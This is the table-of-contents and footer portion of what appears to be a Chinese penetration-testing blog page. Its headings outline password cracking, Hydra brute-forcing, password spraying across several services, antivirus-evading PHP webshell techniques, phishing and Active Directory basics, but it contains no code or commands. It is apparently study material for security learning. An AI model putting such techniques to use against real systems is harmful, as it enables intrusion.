class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E6%94%BB%E5%87%BB2"><span class="toc-number">0.3.</span> <span class="toc-text">离线攻击2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E6%94%BB%E5%87%BB%EF%BC%88Rule-Based-Attacks%EF%BC%89"><span class="toc-number">0.3.1.</span> <span class="toc-text">规则攻击（Rule-Based Attacks）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-best64-%E8%A7%84%E5%88%99%E6%89%A9%E5%B1%95%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">0.3.1.1.</span> <span class="toc-text">使用 best64 规则扩展密码字典</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-KoreLogic-%E8%A7%84%E5%88%99%E6%89%A9%E5%B1%95%E5%AF%86%E7%A0%81"><span class="toc-number">0.3.1.2.</span> <span class="toc-text">使用 KoreLogic 规则扩展密码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99%EF%BC%88Custom-Rules%EF%BC%89"><span class="toc-number">0.3.2.</span> <span class="toc-text">自定义规则（Custom Rules）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99"><span class="toc-number">0.3.2.1.</span> <span class="toc-text">示例：自定义规则</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99"><span class="toc-number">0.3.2.2.</span> <span class="toc-text">测试自定义规则</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">0.3.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB"><span class="toc-number">0.4.</span> <span class="toc-text">在线密码攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hydra"><span class="toc-number">0.4.1.</span> <span class="toc-text">Hydra</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP"><span class="toc-number">0.4.2.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP"><span class="toc-number">0.4.3.</span> <span class="toc-text">SMTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH"><span class="toc-number">0.4.4.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2"><span class="toc-number">0.4.5.</span> <span class="toc-text">HTTP 登录页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7"><span class="toc-number">0.4.6.</span> <span class="toc-text">其他在线密码攻击工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80webshell-php"><span class="toc-number">0.5.</span> <span class="toc-text">免杀webshell(php)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87-%E5%88%86%E5%9D%97%E5%8A%A0%E5%AF%86"><span class="toc-number">0.5.1.</span> <span class="toc-text">采用反序列化+自定义加密解密函数绕过+分块加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E8%A7%A3%E5%AF%86key-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">0.5.2.</span> <span class="toc-text">自定义加解密key+反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">0.5.3.</span> <span class="toc-text">魔法函数+自定义加解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB"><span class="toc-number">0.6.</span> <span class="toc-text">密码喷洒攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-1"><span class="toc-number">0.6.1.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE"><span class="toc-number">0.6.2.</span> <span class="toc-text">RDP 远程桌面协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MailSniper"><span class="toc-number">0.6.3.</span> <span class="toc-text">MailSniper</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SprayingToolkit"><span class="toc-number">0.6.4.</span> <span class="toc-text">SprayingToolkit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-%E4%B8%8B%E8%BD%BD-SprayingToolkit"><span class="toc-number">0.6.4.1.</span> <span class="toc-text">🔹 下载 SprayingToolkit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96"><span class="toc-number">0.6.4.2.</span> <span class="toc-text">🔹 安装依赖</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%9A%80-2-SprayingToolkit-%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">0.6.4.3.</span> <span class="toc-text">🚀 2. SprayingToolkit 使用示例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-OWA%EF%BC%88Outlook-Web-Access%EF%BC%89%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">0.6.4.4.</span> <span class="toc-text">🔹 OWA（Outlook Web Access）密码喷洒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-O365%EF%BC%88Office-365%EF%BC%89%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">0.6.4.5.</span> <span class="toc-text">🔹 O365（Office 365）密码喷洒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-LDAP-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">0.6.4.6.</span> <span class="toc-text">🔹 LDAP 密码喷洒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-WinRM-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">0.6.4.7.</span> <span class="toc-text">🔹 WinRM 密码喷洒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-MSSQL%EF%BC%88Microsoft-SQL-Server%EF%BC%89%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">0.6.4.8.</span> <span class="toc-text">🔹 MSSQL（Microsoft SQL Server）密码喷洒</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing-%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-number">1.</span> <span class="toc-text">Phishing 网络钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">Active Directory 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E5%9F%9F"><span class="toc-number">2.1.</span> <span class="toc-text">Windows 域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Directory"><span class="toc-number">2.2.</span> <span class="toc-text">Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%EF%BC%88Users%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">用户（Users）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%88Machines%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">计算机（Machines）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BB%84%EF%BC%88Security-Groups%EF%BC%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">安全组（Security Groups）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Active-Directory-%E7%94%A8%E6%88%B7%E5%92%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%88ADUC%EF%BC%89"><span class="toc-number">2.2.4.</span> <span class="toc-text">Active Directory 用户和计算机（ADUC）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BB%84%E4%B8%8E-OU"><span class="toc-number">2.2.5.</span> <span class="toc-text">安全组与 OU</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">身份验证方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">Kerberos 身份验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NetNTLM-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.3.2.</span> <span class="toc-text">NetNTLM 身份验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%91%E3%80%81%E6%A3%AE%E6%9E%97%E5%92%8C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">2.4.</span> <span class="toc-text">树、森林和信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%B8%80%E5%9F%9F"><span class="toc-number">2.4.1.</span> <span class="toc-text">单一域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%91%EF%BC%88Trees%EF%BC%89"><span class="toc-number">2.4.2.</span> <span class="toc-text">树（Trees）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%91%E7%BB%93%E6%9E%84"><span class="toc-number">2.4.3.</span> <span class="toc-text">树结构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%AE%E6%9E%97%EF%BC%88Forests%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">森林（Forests）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%EF%BC%88Trust-Relationships%EF%BC%89"><span class="toc-number">2.5.1.</span> <span class="toc-text">信任关系（Trust Relationships）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">2.5.2.</span> <span class="toc-text">信任关系</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero">hackmyvm-zero</a><time datetime="2025-07-28T09:07:40.000Z" title="发表于 2025-07-28 17:07:40">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/htb-season8-2-fluffy/" title="htb-season8.2-fluffy">htb-season8.2-fluffy</a><time datetime="2025-07-28T08:32:46.000Z" title="发表于 2025-07-28 16:32:46">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/htb-season8-1-puppy/" title="htb-season8.1-puppy">htb-season8.1-puppy</a><time datetime="2025-07-28T08:32:29.000Z" title="发表于 2025-07-28 16:32:29">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-quoted/" title="hackmyvm_quoted">hackmyvm_quoted</a><time datetime="2025-07-23T02:55:21.000Z" title="发表于 2025-07-23 10:55:21">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-nessus/" title="hackmyvm_nessus">hackmyvm_nessus</a><time datetime="2025-07-23T02:55:06.000Z" title="发表于 2025-07-23 10:55:06">2025-07-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>